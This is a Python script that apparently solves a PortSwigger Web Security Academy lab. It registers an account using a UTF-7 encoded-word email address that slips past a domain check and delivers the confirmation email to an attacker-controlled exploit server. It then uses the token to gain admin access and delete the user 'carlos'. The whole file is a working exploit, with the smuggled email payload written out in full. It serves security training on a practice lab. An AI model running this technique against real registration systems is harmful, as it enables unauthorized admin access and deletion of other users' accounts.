#!/usr/bin/env python3
"""
Bypassing access controls using email address parsing discrepancies
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 12-bypassing-access-controls-via-email-parsing.md

What this does:
    Registers directly with a MIME RFC 2047 encoded-word email address using
    the UTF-7 charset: =?utf-7?q?foo&AEA-{exploit_domain}&ACA-?=@ginandjuice.shop.
    The registration validator only checks the raw string, which still ends
    in "@ginandjuice.shop" and passes. The mail transport agent decodes the
    UTF-7 encoded-word first -- &AEA- becomes '@' and &ACA- becomes a space
    -- so it actually delivers to foo@{exploit_domain}, an inbox we control.
    This script goes straight to the UTF-7 payload rather than reproducing
    PortSwigger's exploratory sequence of trying ISO-8859-1 and UTF-8
    encodings first (which the target's filter blocks); the lab explicitly
    cites the "Splitting the Email Atom" whitepaper as background, which
    documents UTF-7 as the working bypass, so that exploratory narrowing was
    skipped in favor of the known-working encoding.

Usage:
    python 12-bypassing-access-controls-via-email-parsing.py <lab-url>
    e.g. python 12-bypassing-access-controls-via-email-parsing.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)

    reg_page = c.get(f"{lab_url}/register")
    csrf = re.search(r'name="csrf"\s+value="([^"]+)"', reg_page.text).group(1)

    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', reg_page.text)
    if not exploit_m:
        print("[-] Could not find the exploit-server URL on the registration page.")
        return
    exploit_server = exploit_m.group(1)
    exploit_domain = exploit_server.replace("https://", "")
    print(f"[*] Exploit server: {exploit_domain}")

    # &AEA- = UTF-7 '@', &ACA- = UTF-7 ' ' (space)
    email = f"=?utf-7?q?foo&AEA-{exploit_domain}&ACA-?=@ginandjuice.shop"
    print(f"[*] Email payload: {email}")

    r = c.post(f"{lab_url}/register", data={
        "csrf": csrf, "username": "attacker",
        "email": email, "password": "password123"
    })
    print(f"[*] Register response status: {r.status_code}")

    time.sleep(3)
    email_page = c.get(f"{exploit_server}/email")
    token_m = re.search(r"temp-registration-token=([^\"'&\s<]+)", email_page.text)
    if not token_m:
        token_m = re.search(r'register[?/][^"]*token=([^"&\s<]+)', email_page.text)
    if not token_m:
        print(f"[-] No confirmation token found. Email page length: {len(email_page.text)}")
        return
    token = token_m.group(1)
    print(f"[*] Confirmation token: {token}")

    c.get(f"{lab_url}/register?temp-registration-token={token}")

    login_page = c.get(f"{lab_url}/login")
    csrf = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text).group(1)
    c.post(f"{lab_url}/login", data={
        "csrf": csrf, "username": "attacker", "password": "password123"
    })
    print("[*] Logged in as attacker")

    admin_r = c.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {admin_r.status_code}, has delete: {'delete' in admin_r.text.lower()}")

    if "delete" in admin_r.text.lower():
        c.get(f"{lab_url}/admin/delete?username=carlos")
        print("[*] Deleted carlos")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- UTF-7 encoded-word smuggled registration past the domain check.")
    else:
        print("[-] Not solved yet -- confirm the confirmation email actually arrived.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
